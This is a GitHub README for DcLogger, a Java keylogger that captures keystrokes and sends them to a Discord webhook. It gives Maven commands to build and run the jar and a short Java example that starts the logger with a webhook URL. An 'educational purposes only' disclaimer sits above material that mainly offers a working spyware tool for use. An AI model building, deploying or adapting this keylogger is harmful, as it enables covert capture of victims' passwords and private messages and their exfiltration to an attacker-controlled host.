<h1 align="center">DcLogger</h1>

<p align="center">A simple key logger application which sends the keys to a discord webhook implemented in Java.</p>

<div align="center">
    <a href="https://lyzev.github.io/discord/"><img src="https://img.shields.io/discord/610120595765723137?logo=discord" alt="Discord"/></a>
    <br><br>
    <img src="https://img.shields.io/github/last-commit/Lyzev/DcLogger" alt="GitHub last commit"/>
    <img src="https://img.shields.io/github/commit-activity/w/Lyzev/DcLogger" alt="GitHub commit activity"/>
    <br>
    <img src="https://img.shields.io/github/languages/code-size/Lyzev/DcLogger" alt="GitHub code size in bytes"/>
    <img src="https://img.shields.io/github/contributors/Lyzev/DcLogger" alt="GitHub contributors"/>
</div>

## Disclaimer
Please note, this repository is for educational and proof of concept purposes only. The information and code contained within it should not be used for any illegal or unethical activities. The contributors to this repository are not liable for any actions taken or damages caused by the use of the information or code provided here. It is the responsibility of the user to ensure compliance with all applicable laws and regulations, and to obtain any necessary permissions before using the code or information.

## Usage

### How to Build and Run Project
Build project: 
```bash
mvn package
```
Run ./target/DcLogger-jar-with-dependencies.jar file using command:
```bash
java -jar ./target/DcLogger-jar-with-dependencies.jar
```
The keys will be sent to the provided webhook.

### Example
```java
/**
 * This is an example on how to use {@link KeyLogger}.
 *
 * @throws MalformedURLException the exception is going to be thrown if the url is incorrect
 */
public static void main(String[] args) throws MalformedURLException {
    KeyLogger logger = new KeyLogger("WEBHOOK-URL"); // Declares and initializes the keylogger
    logger.start(); // Registers the NativeLogger (If it isn't registered the event will not be called, so nothing would be logged)
}
```

## Bugs and Suggestions
Bug reports and suggestions should be made in this repo's [issue tracker](https://github.com/Lyzev/DcLogger/issues) using the templates provided. Please provide as much information as you can to best help us understand your issue and give a better chance of it being resolved.

## Credits
* [vakho10](https://github.com/vakho10) for [java-keylogger](https://github.com/vakho10/java-keylogger)
